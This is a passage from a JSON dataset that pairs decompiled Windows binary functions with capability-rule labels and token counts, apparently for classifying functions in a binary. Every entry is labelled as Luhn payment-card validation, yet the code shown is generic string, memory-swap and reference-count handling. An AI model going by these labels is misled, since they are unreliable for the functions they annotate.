iStack232 = 0x140082b7b;\n        fcn.14002a720(puStack264, iVar6, iVar3, 0);\n        *(iStack280 + 0x28) = iVar6;\n        *(iVar6 + -2 + uStack248 * 2) = 0;\n        *(iStack280 + 0x30) = iVar3;\n        if (puStack192 != puStack240) {\n            iStack232 = 0x140082b9a;\n            fcn.1400b64d0();\n        }\n        iStack232 = 0x140082ba6;\n        (**(*piStack272 + 0x30))(puStack264, piStack272);\n        iVar3 = iStack184;\n        if (iStack184 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iStack184 + 1U) * 2;\n            iStack232 = 0x140082bcd;\n            iVar7 = fcn.1400b64f0(iVar6);\n            iStack232 = 0x140082be1;\n            fcn.14002a720(puStack264, iVar7, iVar3, 0);\n            *(iStack280 + 0x38) = iVar7;\n            *(iVar7 + -2 + iVar6) = 0;\n            *(iStack280 + 0x40) = iVar3;\n            if (puStack192 != puStack240) {\n                iStack232 = 0x140082c00;\n                fcn.1400b64d0();\n            }\n            iStack232 = 0x140082c0c;\n            (**(*piStack272 + 0x38))(puStack264, piStack272);\n            if (iStack184 + 1U < 0x3ffffffffffffffd) {\n                iVar3 = (iStack184 + 1U) * 2;\n                iStack232 = 0x140082c33;\n                iVar6 = fcn.1400b64f0(iVar3);\n                iStack232 = 0x140082c47;\n                fcn.14002a720(puStack264, iVar6, iStack184, 0);\n                *(iStack280 + 0x48) = iVar6;\n                *(iVar6 + -2 + iVar3) = 0;\n                *(iStack280 + 0x50) = iStack184;\n                if (puStack192 != puStack240) {\n                    iStack232 = 0x140082c66;\n                    fcn.1400b64d0();\n                }\n                iStack232 = 0x140082c6f;\n                uVar5 = (**(*piStack272 + 0x48))(piStack272);\n                *(iStack280 + 0x5c) = uVar5;\n                iStack232 = 0x140082c7b;\n                uVar5 = (**(*piStack272 + 0x50))(piStack272);\n                *(iStack280 + 0x60) = uVar5;\n                return;\n            }\n            iStack232 = 0x140082cc0;\n            uVar8 = fcn.1400b7660();\n        }\n        else {\n            iStack232 = 0x140082cc7;\n            uVar8 = fcn.1400b7660();\n        }\n        do {\n            if (puStack192 != puStack240) {\n                iStack232 = 0x140082ca4;\n                fcn.1400b64d0();\n            }\n            iStack232 = 0x140082cac;\n            uVar8 = fcn.14000f000(uVar8);\n        } while( true );\n    }\n    iStack232 = 0x140082cce;\n    fcn.1400b7660();\n    iStack232 = iStack184;\n    puStack368 = &stack0xfffffffffffffee0;\n    iStack336 = 0x140082cf2;\n    uVar4 = (**(*piStack376 + 0x10))(piStack376);\n    *(iVar6 + 0x22) = uVar4;\n    iStack336 = 0x140082cff;\n    uVar4 = (**(*piStack376 + 0x18))(piStack376);\n    *(iVar6 + 0x24) = uVar4;\n    iStack336 = 0x140082d0c;\n    uVar5 = (**(*piStack376 + 0x40))(piStack376);\n    *(iVar6 + 0x7a) = 1;\n    *(iVar6 + 0x58) = uVar5;\n    iVar3 = *piStack376;\n    *(iVar6 + 0x10) = 0;\n    *(iVar6 + 0x28) = 0;\n    *(iVar6 + 0x38) = 0;\n    *(iVar6 + 0x48) = 0;\n    iStack336 = 0x140082d3f;\n    (**(iVar3 + 0x20))(puStack368, piStack376);\n    iVar3 = *(iStack288 + -0x18);\n    iStack336 = 0x140082d52;\n    iStack360 = fcn.1400b64f0(iVar3 + 1);\n    iStack336 = 0x140082d66;\n    iVar7 = iVar3;\n    fcn.14001efe0(puStack368, iStack360, iVar3, 0);\n    piStack344 = *0x140102a70;\n    *(iStack360 + iVar3) = 0;\n    *(iVar6 + 0x10) = iStack360;\n    iVar2 = *piStack344;\n    *(iVar6 + 0x18) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack288 + -8);\n        *(iStack288 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack288 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack336 = 0x140082f60;\n        fcn.140075f90(iStack288 + -0x18, &stack0xfffffffffffffedf);\n    }\n    iStack336 = 0x140082daa;\n    piVar10 = piStack376;\n    (**(*piStack376 + 0x28))(puStack368);\n    iVar3 = *(iStack288 + -0x18);\n    uStack352 = iVar3 + 1;\n    if (uStack352 < 0x3ffffffffffffffd) {\n        iStack336 = 0x140082dd5;\n        iVar7 = fcn.1400b64f0(uStack352 * 2);\n        iStack336 = 0x140082de9;\n        fcn.14001df50(puStack368, iVar7, iVar3, 0);\n        iVar2 = *piStack344;\n        *(iVar6 + 0x28) = iVar7;\n        *(iVar7 + -2 + uStack352 * 2) = 0;\n        *(iVar6 + 0x30) = iVar3;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack288 + -8);\n            *(iStack288 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack288 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            iStack336 = 0x140082fd8;\n            fcn.14006ca90(iStack288 + -0x18, &stack0xfffffffffffffedf);\n        }\n        iStack336 = 0x140082e29;\n        (**(*piStack376 + 0x30))(puStack368, piStack376);\n        iVar3 = *(iStack288 + -0x18);\n        if (iVar3 + 1U < 0x3ffffffffffffffd) {\n            iVar7 = (iVar3 + 1U) * 2;\n            iStack336 = 0x140082e54;\n            iVar9 = fcn.1400b64f0(iVar7);\n            iStack336 = 0x140082e68;\n            fcn.14001df50(puStack368, iVar9, iVar3, 0);\n            iVar2 = *piStack344;\n            *(iVar6 + 0x38) = iVar9;\n            *(iVar9 + -2 + iVar7) = 0;\n            *(iVar6 + 0x40) = iVar3;\n            if (iVar2 == 0) {\n                iVar2 = *(iStack288 + -8);\n                *(iStack288 + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = iStack288 + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                iStack336 = 0x140082fb0;\n                fcn.14006ca90(iStack288 + -0x18, &stack0xfffffffffffffedf);\n            }\n            iStack336 = 0x140082ea7;\n            (**(*piStack376 + 0x38))(puStack368, piStack376);\n            iVar3 = *(iStack288 + -0x18);\n            if (iVar3 + 1U < 0x3ffffffffffffffd) {\n                iVar7 = (iVar3 + 1U) * 2;\n                iStack336 = 0x140082ed2;\n                iVar9 = fcn.1400b64f0(iVar7);\n                iStack336 = 0x140082ee6;\n                fcn.14001df50(puStack368, iVar9, iVar3, 0);\n                iVar2 = *piStack344;\n                *(iVar6 + 0x48) = iVar9;\n                *(iVar9 + -2 + iVar7) = 0;\n                *(iVar6 + 0x50) = iVar3;\n                if (iVar2 == 0) {\n                    iVar2 = *(iStack288 + -8);\n                    *(iStack288 + -8) = iVar2 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = iStack288 + -8;\n                    iVar2 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar2 < 1) {\n                    iStack336 = 0x140082f84;\n                    fcn.14006ca90(iStack288 + -0x18, &stack0xfffffffffffffedf);\n                }\n                iStack336 = 0x140082f19;\n                uVar5 = (**(*piStack376 + 0x48))(piStack376);\n                *(iVar6 + 0x5c) = uVar5;\n                iStack336 = 0x140082f25;\n                uVar5 = (**(*piStack376 + 0x50))(piStack376);\n                *(iVar6 + 0x60) = uVar5;\n                return;\n            }\n            iStack336 = 0x140083025;\n            uVar8 = fcn.1400b7660();\n        }\n        else {\n            iStack336 = 0x140082fe2;\n            uVar8 = fcn.1400b7660();\n        }\n        do {\n            iStack336 = 0x140082ff8;\n            fcn.14006caa0(iStack288 + -0x18);\n            iStack336 = 0x140083000;\n            uVar8 = fcn.14000f000(uVar8);\n        } while( true );\n    }\n    iStack336 = 0x14008302c;\n    fcn.1400b7660();\n    iStack336 = iVar3;\n    uVar4 = (**(*piVar10 + 0x10))(piVar10);\n    *(iVar7 + 0x22) = uVar4;\n    uVar4 = (**(*piVar10 + 0x18))(piVar10);\n    *(iVar7 + 0x24) = uVar4;\n    uVar5 = (**(*piVar10 + 0x40))(piVar10);\n    *(iVar7 + 0x7a) = 1;\n    *(iVar7 + 0x58) = uVar5;\n    iVar3 = *piVar10;\n    *(iVar7 + 0x10) = 0;\n    *(iVar7 + 0x28) = 0;\n    *(iVar7 + 0x38) = 0;\n    *(iVar7 + 0x48) = 0;\n    (**(iVar3 + 0x20))(&stack0xfffffffffffffe60, piVar10);\n    iVar3 = iStack408;\n    iVar6 = fcn.1400b64f0(iStack408 + 1);\n    fcn.140029990(&stack0xfffffffffffffe60, iVar6, iVar3, 0);\n    *(iVar6 + iVar3) = 0;\n    *(iVar7 + 0x10) = iVar6;\n    *(iVar7 + 0x18) = iVar3;\n    if (puStack416 != &stack0xfffffffffffffe70) {\n        fcn.1400b64d0();\n    }\n    arg1 = &stack0xfffffffffffffe60;\n    (**(*piVar10 + 0x28))(&stack0xfffffffffffffe60, piVar10);\n    iVar3 = iStack408;\n    if (0x3ffffffffffffffc < iStack408 + 1U) {\n        fcn.1400b7660();\n        *arg1 = 0x14010aa10;\n        fcn.1400b1850(arg1 + 4);\n        *arg1 = 0x14010a460;\n        fcn.14007d8f0(arg1);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)(arg1);\n        return;\n    }\n    iVar6 = (iStack408 + 1U) * 2;\n    iVar9 = fcn.1400b64f0(iVar6);\n    fcn.14002a720(&stack0xfffffffffffffe60, iVar9, iVar3, 0);\n    *(iVar7 + 0x28) = iVar9;\n    *(iVar9 + -2 + iVar6) = 0;\n    *(iVar7 + 0x30) = iVar3;\n    if (puStack416 != &stack0xfffffffffffffe70) {\n        fcn.1400b64d0();\n    }\n    (**(*piVar10 + 0x30))(&stack0xfffffffffffffe60, piVar10);\n    iVar3 = iStack408;\n    if (iStack408 + 1U < 0x3ffffffffffffffd) {\n        iVar6 = (iStack408 + 1U) * 2;\n        iVar9 = fcn.1400b64f0(iVar6);\n        fcn.14002a720(&stack0xfffffffffffffe60, iVar9, iVar3, 0);\n        *(iVar7 + 0x38) = iVar9;\n        *(iVar9 + -2 + iVar6) = 0;\n        *(iVar7 + 0x40) = iVar3;\n        if (puStack416 != &stack0xfffffffffffffe70) {\n            fcn.1400b64d0();\n        }\n        (**(*piVar10 + 0x38))(&stack0xfffffffffffffe60, piVar10);\n        if (iStack408 + 1U < 0x3ffffffffffffffd) {\n            iVar3 = (iStack408 + 1U) * 2;\n            iVar6 = fcn.1400b64f0(iVar3);\n            fcn.14002a720(&stack0xfffffffffffffe60, iVar6, iStack408, 0);\n            *(iVar7 + 0x48) = iVar6;\n            *(iVar6 + -2 + iVar3) = 0;\n            *(iVar7 + 0x50) = iStack408;\n            if (puStack416 != &stack0xfffffffffffffe70) {\n                fcn.1400b64d0();\n            }\n            uVar5 = (**(*piVar10 + 0x48))(piVar10);\n            *(iVar7 + 0x5c) = uVar5;\n            uVar5 = (**(*piVar10 + 0x50))(piVar10);\n            *(iVar7 + 0x60) = uVar5;\n            return;\n        }\n        uVar8 = fcn.1400b7660();\n    }\n    else {\n        uVar8 = fcn.1400b7660();\n    }\n    do {\n        if (puStack416 != &stack0xfffffffffffffe70) {\n            fcn.1400b64d0();\n        }\n        uVar8 = fcn.14000f000(uVar8);\n    } while( true );\n}\n",
        "token_count": 6550
    },
    "140082cd": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.140082cd0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ushort uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    ulong *arg1;\n    int64_t *piVar10;\n    uchar *puStack192;\n    int64_t iStack184;\n    uchar auStack176 [16];\n    int64_t iStack160;\n    int64_t *piStack152;\n    uchar *puStack144;\n    int64_t iStack136;\n    uint64_t uStack128;\n    int32_t *piStack120;\n    int64_t iStack112;\n    uchar uStack65;\n    int64_t iStack64;\n    \n    puStack144 = &stack0xffffffffffffffc0;\n    iStack112 = 0x140082cf2;\n    uVar4 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x22) = uVar4;\n    iStack112 = 0x140082cff;\n    uVar4 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x24) = uVar4;\n    iStack112 = 0x140082d0c;\n    uVar5 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x7a) = 1;\n    *(arg3 + 0x58) = uVar5;\n    iVar3 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    iStack112 = 0x140082d3f;\n    (**(iVar3 + 0x20))(puStack144, arg2);\n    iVar3 = *(iStack64 + -0x18);\n    iStack112 = 0x140082d52;\n    iStack136 = fcn.1400b64f0(iVar3 + 1);\n    iStack112 = 0x140082d66;\n    iVar6 = iVar3;\n    fcn.14001efe0(puStack144, iStack136, iVar3, 0);\n    piStack120 = *0x140102a70;\n    *(iStack136 + iVar3) = 0;\n    *(arg3 + 0x10) = iStack136;\n    iVar2 = *piStack120;\n    *(arg3 + 0x18) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack64 + -8);\n        *(iStack64 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack64 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack112 = 0x140082f60;\n        fcn.140075f90(iStack64 + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x140082daa;\n    piVar10 = arg2;\n    (**(*arg2 + 0x28))(puStack144);\n    iVar3 = *(iStack64 + -0x18);\n    uStack128 = iVar3 + 1;\n    if (0x3ffffffffffffffc < uStack128) {\n        iStack112 = 0x14008302c;\n        fcn.1400b7660();\n        iStack160 = arg3;\n        piStack152 = arg2;\n        iStack112 = iVar3;\n        uVar4 = (**(*piVar10 + 0x10))(piVar10);\n        *(iVar6 + 0x22) = uVar4;\n        uVar4 = (**(*piVar10 + 0x18))(piVar10);\n        *(iVar6 + 0x24) = uVar4;\n        uVar5 = (**(*piVar10 + 0x40))(piVar10);\n        *(iVar6 + 0x7a) = 1;\n        *(iVar6 + 0x58) = uVar5;\n        iVar3 = *piVar10;\n        *(iVar6 + 0x10) = 0;\n        *(iVar6 + 0x28) = 0;\n        *(iVar6 + 0x38) = 0;\n        *(iVar6 + 0x48) = 0;\n        (**(iVar3 + 0x20))(&stack0xffffffffffffff40, piVar10);\n        iVar3 = iStack184;\n        iVar7 = fcn.1400b64f0(iStack184 + 1);\n        fcn.140029990(&stack0xffffffffffffff40, iVar7, iVar3, 0);\n        *(iVar7 + iVar3) = 0;\n        *(iVar6 + 0x10) = iVar7;\n        *(iVar6 + 0x18) = iVar3;\n        if (puStack192 != &stack0xffffffffffffff50) {\n            fcn.1400b64d0();\n        }\n        arg1 = &stack0xffffffffffffff40;\n        (**(*piVar10 + 0x28))(&stack0xffffffffffffff40, piVar10);\n        iVar3 = iStack184;\n        if (0x3ffffffffffffffc < iStack184 + 1U) {\n            fcn.1400b7660();\n            *arg1 = 0x14010aa10;\n            fcn.1400b1850(arg1 + 4);\n            *arg1 = 0x14010a460;\n            fcn.14007d8f0(arg1);\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(arg1);\n            return;\n        }\n        iVar7 = (iStack184 + 1U) * 2;\n        iVar9 = fcn.1400b64f0(iVar7);\n        fcn.14002a720(&stack0xffffffffffffff40, iVar9, iVar3, 0);\n        *(iVar6 + 0x28) = iVar9;\n        *(iVar9 + -2 + iVar7) = 0;\n        *(iVar6 + 0x30) = iVar3;\n        if (puStack192 != &stack0xffffffffffffff50) {\n            fcn.1400b64d0();\n        }\n        (**(*piVar10 + 0x30))(&stack0xffffffffffffff40, piVar10);\n        iVar3 = iStack184;\n        if (iStack184 + 1U < 0x3ffffffffffffffd) {\n            iVar7 = (iStack184 + 1U) * 2;\n            iVar9 = fcn.1400b64f0(iVar7);\n            fcn.14002a720(&stack0xffffffffffffff40, iVar9, iVar3, 0);\n            *(iVar6 + 0x38) = iVar9;\n            *(iVar9 + -2 + iVar7) = 0;\n            *(iVar6 + 0x40) = iVar3;\n            if (puStack192 != &stack0xffffffffffffff50) {\n                fcn.1400b64d0();\n            }\n            (**(*piVar10 + 0x38))(&stack0xffffffffffffff40, piVar10);\n            if (iStack184 + 1U < 0x3ffffffffffffffd) {\n                iVar3 = (iStack184 + 1U) * 2;\n                iVar7 = fcn.1400b64f0(iVar3);\n                fcn.14002a720(&stack0xffffffffffffff40, iVar7, iStack184, 0);\n                *(iVar6 + 0x48) = iVar7;\n                *(iVar7 + -2 + iVar3) = 0;\n                *(iVar6 + 0x50) = iStack184;\n                if (puStack192 != &stack0xffffffffffffff50) {\n                    fcn.1400b64d0();\n                }\n                uVar5 = (**(*piVar10 + 0x48))(piVar10);\n                *(iVar6 + 0x5c) = uVar5;\n                uVar5 = (**(*piVar10 + 0x50))(piVar10);\n                *(iVar6 + 0x60) = uVar5;\n                return;\n            }\n            uVar8 = fcn.1400b7660();\n        }\n        else {\n            uVar8 = fcn.1400b7660();\n        }\n        do {\n            if (puStack192 != &stack0xffffffffffffff50) {\n                fcn.1400b64d0();\n            }\n            uVar8 = fcn.14000f000(uVar8);\n        } while( true );\n    }\n    iStack112 = 0x140082dd5;\n    iVar6 = fcn.1400b64f0(uStack128 * 2);\n    iStack112 = 0x140082de9;\n    fcn.14001df50(puStack144, iVar6, iVar3, 0);\n    iVar2 = *piStack120;\n    *(arg3 + 0x28) = iVar6;\n    *(iVar6 + -2 + uStack128 * 2) = 0;\n    *(arg3 + 0x30) = iVar3;\n    if (iVar2 == 0) {\n        iVar2 = *(iStack64 + -8);\n        *(iStack64 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack64 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        iStack112 = 0x140082fd8;\n        fcn.14006ca90(iStack64 + -0x18, &stack0xffffffffffffffbf);\n    }\n    iStack112 = 0x140082e29;\n    (**(*arg2 + 0x30))(puStack144, arg2);\n    iVar3 = *(iStack64 + -0x18);\n    if (iVar3 + 1U < 0x3ffffffffffffffd) {\n        iVar6 = (iVar3 + 1U) * 2;\n        iStack112 = 0x140082e54;\n        iVar7 = fcn.1400b64f0(iVar6);\n        iStack112 = 0x140082e68;\n        fcn.14001df50(puStack144, iVar7, iVar3, 0);\n        iVar2 = *piStack120;\n        *(arg3 + 0x38) = iVar7;\n        *(iVar7 + -2 + iVar6) = 0;\n        *(arg3 + 0x40) = iVar3;\n        if (iVar2 == 0) {\n            iVar2 = *(iStack64 + -8);\n            *(iStack64 + -8) = iVar2 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = iStack64 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar2 < 1) {\n            iStack112 = 0x140082fb0;\n            fcn.14006ca90(iStack64 + -0x18, &stack0xffffffffffffffbf);\n        }\n        iStack112 = 0x140082ea7;\n        (**(*arg2 + 0x38))(puStack144, arg2);\n        iVar3 = *(iStack64 + -0x18);\n        if (iVar3 + 1U < 0x3ffffffffffffffd) {\n            iVar6 = (iVar3 + 1U) * 2;\n            iStack112 = 0x140082ed2;\n            iVar7 = fcn.1400b64f0(iVar6);\n            iStack112 = 0x140082ee6;\n            fcn.14001df50(puStack144, iVar7, iVar3, 0);\n            iVar2 = *piStack120;\n            *(arg3 + 0x48) = iVar7;\n            *(iVar7 + -2 + iVar6) = 0;\n            *(arg3 + 0x50) = iVar3;\n            if (iVar2 == 0) {\n                iVar2 = *(iStack64 + -8);\n                *(iStack64 + -8) = iVar2 + -1;\n            }\n            else {\n                LOCK();\n                piVar1 = iStack64 + -8;\n                iVar2 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n            }\n            if (iVar2 < 1) {\n                iStack112 = 0x140082f84;\n                fcn.14006ca90(iStack64 + -0x18, &stack0xffffffffffffffbf);\n            }\n            iStack112 = 0x140082f19;\n            uVar5 = (**(*arg2 + 0x48))(arg2);\n            *(arg3 + 0x5c) = uVar5;\n            iStack112 = 0x140082f25;\n            uVar5 = (**(*arg2 + 0x50))(arg2);\n            *(arg3 + 0x60) = uVar5;\n            return;\n        }\n        iStack112 = 0x140083025;\n        uVar8 = fcn.1400b7660();\n    }\n    else {\n        iStack112 = 0x140082fe2;\n        uVar8 = fcn.1400b7660();\n    }\n    do {\n        iStack112 = 0x140082ff8;\n        fcn.14006caa0(iStack64 + -0x18);\n        iStack112 = 0x140083000;\n        uVar8 = fcn.14000f000(uVar8);\n    } while( true );\n}\n",
        "token_count": 3169
    },
    "1400a18b": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400a18b0(ulong *s2, ulong *arg2)\n\n{\n    ulong *puVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    ulong *puVar5;\n    ulong uVar6;\n    ulong *puVar7;\n    ulong *puVar8;\n    int64_t iVar9;\n    uchar auStack72 [16];\n    \n    if (s2 == arg2) {\n        return;\n    }\n    puVar7 = *s2;\n    puVar5 = s2 + 2;\n    puVar8 = *arg2;\n    puVar1 = arg2 + 2;\n    if (puVar5 == puVar7) {\n        iVar9 = s2[1];\n        if (puVar1 == puVar8) {\n            iVar4 = arg2[1];\n            if (iVar9 == 0) {\n                uVar6 = 0;\n                if (iVar4 != 0) {\n                    uVar6 = 0xffffffffffffffff;\n                    if (iVar4 + 1 != 0) {\n                        sub.msvcrt.dll_memcpy(puVar5, puVar8, iVar4 + 1);\n                        uVar6 = arg2[1];\n                        puVar8 = *arg2;\n                    }\n                    s2[1] = uVar6;\n                    arg2[1] = 0;\n                    *puVar8 = 0;\n                    return;\n                }\n            }\n            else {\n                iVar2 = iVar9 + 1;\n                if (iVar4 == 0) {\n                    if (iVar9 != -1) {\n                        sub.msvcrt.dll_memcpy(puVar1, puVar7, iVar2);\n                        puVar7 = *s2;\n                        iVar9 = s2[1];\n                    }\n                    arg2[1] = iVar9;\n                    s2[1] = 0;\n                    *puVar7 = 0;\n                    return;\n                }\n                iVar4 = iVar4 + 1;\n                if (iVar4 == 0) {\n                    if (iVar2 == 0) {\n                        iVar4 = -1;\n                        uVar6 = 0xffffffffffffffff;\n                    }\n                    else {\n                        sub.msvcrt.dll_memcpy(puVar1, puVar5, iVar2);\n                        uVar6 = s2[1];\n                        iVar4 = arg2[1];\n                    }\n                }\n                else {\n                    sub.msvcrt.dll_memcpy(auStack72, puVar1, iVar4);\n                    if (iVar2 != 0) {\n                        sub.msvcrt.dll_memcpy(puVar1, puVar7, iVar2);\n                    }\n                    sub.msvcrt.dll_memcpy(puVar7, auStack72, iVar4);\n                    uVar6 = s2[1];\n                    iVar4 = arg2[1];\n                }\n            }\n        }\n        else {\n            uVar3 = arg2[2];\n            uVar6 = 0xffffffffffffffff;\n            if (iVar9 != -1) {\n                sub.msvcrt.dll_memcpy(puVar1, puVar5);\n                uVar6 = s2[1];\n            }\n            *s2 = puVar8;\n            *arg2 = puVar1;\n            s2[2] = uVar3;\n            iVar4 = arg2[1];\n        }\n    }\n    else {\n        uVar6 = s2[2];\n        if (puVar1 == puVar8) {\n            iVar4 = -1;\n            if (arg2[1] != -1) {\n                puVar5 = sub.msvcrt.dll_memcpy(puVar5, puVar1);\n                iVar4 = arg2[1];\n            }\n            *arg2 = puVar7;\n            *s2 = puVar5;\n        }\n        else {\n            *s2 = puVar8;\n            *arg2 = puVar7;\n            s2[2] = arg2[2];\n            iVar4 = arg2[1];\n        }\n        arg2[2] = uVar6;\n        uVar6 = s2[1];\n    }\n    s2[1] = iVar4;\n    arg2[1] = uVar6;\n    return;\n}\n",
        "token_count": 909
    },
    "1400ad25": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400ad250(int64_t arg1, int64_t arg2)\n\n{\n    int32_t **ppiVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int32_t *piVar10;\n    ulong *puVar11;\n    uint uStack32;\n    \n    uVar7 = *(arg2 + 8);\n    uVar6 = *(arg2 + 0x10);\n    *(arg1 + 8) = uVar7;\n    *(arg1 + 0x10) = uVar6;\n    *(arg1 + 0x18) = *(arg2 + 0x18);\n    *(arg1 + 0x20) = *(arg2 + 0x20);\n    uVar6 = *(arg2 + 0x28);\n    *(arg2 + 0x28) = 0;\n    *(arg1 + 0x28) = uVar6;\n    if ((*(arg1 + 200) != arg1 + 0x40) && (*(arg1 + 200) != 0)) {\n        fcn.1400b64c0(uVar7);\n    }\n    iVar9 = *(arg2 + 200);\n    if (iVar9 == arg2 + 0x40) {\n        *(arg1 + 200) = arg1 + 0x40;\n        iVar9 = 0;\n        *(arg1 + 0xc0) = 8;\n        do {\n            puVar11 = *(arg2 + 200) + iVar9;\n            uVar6 = *puVar11;\n            uVar7 = puVar11[1];\n            *puVar11 = 0;\n            *(puVar11 + 1) = 0;\n            iVar8 = *(arg1 + 200);\n            *(iVar8 + iVar9) = uVar6;\n            uStack32 = uVar7;\n            *(iVar8 + 8 + iVar9) = uStack32;\n            iVar9 = iVar9 + 0x10;\n        } while (iVar9 != 0x80);\n    }\n    else {\n        *(arg2 + 200) = arg2 + 0x40;\n        *(arg1 + 200) = iVar9;\n        uVar4 = *(arg2 + 0xc0);\n        *(arg2 + 0xc0) = 8;\n        *(arg1 + 0xc0) = uVar4;\n    }\n    piVar10 = *0x1400fb720;\n    ppiVar1 = arg2 + 0xd0;\n    ppiVar2 = arg1 + 0xd0;\n    piVar5 = *ppiVar1;\n    if (piVar5 != *0x1400fb720) {\n        if (**0x140102a70 == 0) {\n            *piVar5 = *piVar5 + 1;\n        }\n        else {\n            LOCK();\n            *piVar5 = *piVar5 + 1;\n            piVar10 = *0x1400fb720;\n        }\n    }\n    piVar5 = *ppiVar2;\n    if (piVar5 != piVar10) {\n        if (**0x140102a70 == 0) {\n            iVar3 = *piVar5;\n            *piVar5 = iVar3 + -1;\n        }\n        else {\n            LOCK();\n            iVar3 = *piVar5;\n            *piVar5 = *piVar5 + -1;\n        }\n        if (iVar3 == 1) {\n            fcn.14009f4c0(piVar5);\n            fcn.1400b64d0(piVar5);\n            *ppiVar2 = *ppiVar1;\n            return;\n        }\n    }\n    *ppiVar2 = *ppiVar1;\n    return;\n}\n",
        "token_count": 869
    },
    "1400ad62": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400ad620(ulong *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uchar uStack25;\n    \n    *arg1 = 0x14010a490;\n    iVar1 = *arg2;\n    if (*(iVar1 + -8) < 0) {\n        uVar2 = fcn.1400760a0(iVar1 + -0x18, &uStack25, 0);\n        arg1[1] = uVar2;\n        return;\n    }\n    if (**0x140102a70 == 0) {\n        *(iVar1 + -8) = *(iVar1 + -8) + 1;\n        arg1[1] = iVar1;\n        return;\n    }\n    LOCK();\n    *(iVar1 + -8) = *(iVar1 + -8) + 1;\n    arg1[1] = iVar1;\n    return;\n}\n",
        "token_count": 210
    },
    "1400b185": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.1400b1850(ulong *arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uchar uStack9;\n    \n    if (**arg1 != 0x1400ad730) {\n    // WARNING: Could not recover jumptable at 0x0001400b18d5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (***arg1)();\n        return;\n    }\n    *arg1 = 0x14010a490;\n    iVar3 = arg1[1];\n    if (**0x140102a70 == 0) {\n        iVar2 = *(iVar3 + -8);\n        *(iVar3 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar3 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(iVar3 + -0x18, &uStack9);\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "1400b778": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
